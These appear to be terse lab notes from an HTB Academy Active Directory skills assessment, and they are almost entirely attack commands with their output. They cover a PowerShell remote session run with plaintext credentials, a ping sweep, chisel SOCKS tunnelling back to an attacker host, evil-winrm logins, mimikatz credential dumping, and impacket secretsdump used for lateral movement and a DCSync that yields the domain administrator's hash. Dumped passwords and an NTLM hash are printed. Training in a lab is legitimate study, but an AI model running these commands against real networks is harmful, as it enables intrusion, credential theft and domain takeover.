# Skills Assessment Part I
```
$password = ConvertTo-SecureString 'lucky7' -AsPlainText -Force ; $cred = new-object System.Management.Automation.PSCredential ('INLANEFREIGHT.LOCAL\svc_sql', $password ); $s= New-PSSession -ComputerName MS01 -Credential $cred; Invoke-Command -Session $s { type C:\PATH\TO\ADMIN\FLAG.txt}

PS> 1..254 | % {echo "172.16.6.$_"; ping -n 1 -w 100 172.16.6.$_} | Select-String ttl

```

Reply from 172.16.6.3: bytes=32 time<1ms TTL=128     Administrator Desktop on DC01
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128    svc_sql's desktop MS01
Reply from 172.16.6.100: bytes=32 time<1ms TTL=128

### Chisel from HTB academy - SOCKS5 Tunneling with Chisel
```
socks4        127.0.0.1 9050
OR
socks5 127.0.0.1 1080
```

```
C:\chisel.exe server -v -p 1234 --socks5

./chisel client -v 10.129.49.186:1234 socks

proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7

.\mimikatz.exe SEKURLSA::LogonPasswords exit

```

### or use secretdump to get another user's hash(Lateral movement)

```
proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/svc_sql:"lucky7"@172.16.6.50
```

        wdigest :
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : tpetty
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Sup3rS3cur3D0m@inU2eR


### Get the final administrator's hash by dsync attack
```
proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/tpetty:"Sup3rS3cur3D0m@inU2eR"@172.16.6.3 -just-dc-user INLANEFREIGHT/administrator
```

### Login
```
proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```